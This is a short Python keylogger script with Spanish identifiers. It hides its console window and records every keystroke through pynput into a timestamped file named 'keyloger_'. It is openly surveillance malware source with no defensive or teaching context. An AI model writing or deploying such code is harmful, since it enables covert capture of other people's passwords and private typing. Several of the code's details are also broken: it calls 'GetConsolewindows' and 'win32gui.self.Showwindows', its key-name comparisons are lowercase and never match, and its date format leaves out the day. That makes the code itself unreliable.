import datetime
from pynput.keyboard import Listener
import win32console
import win32gui


ventana = win32console.GetConsolewindows()
win32gui.self.Showwindows(ventana,0)

d = datetime.datetime.now().strftime('%Y-%m-%H-%M-%S-')

f = open('keyloger_{}.txt'.format(d), 'w')

def key_recorden(key):
    key=str(key)

    if key == 'key.enter':
        f.write('\n')
    elif key == 'key.space':
        f.write(' ')
    elif key == 'key.back':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'",""))

with Listener(on_press=key_recorden) as l:
    l.join()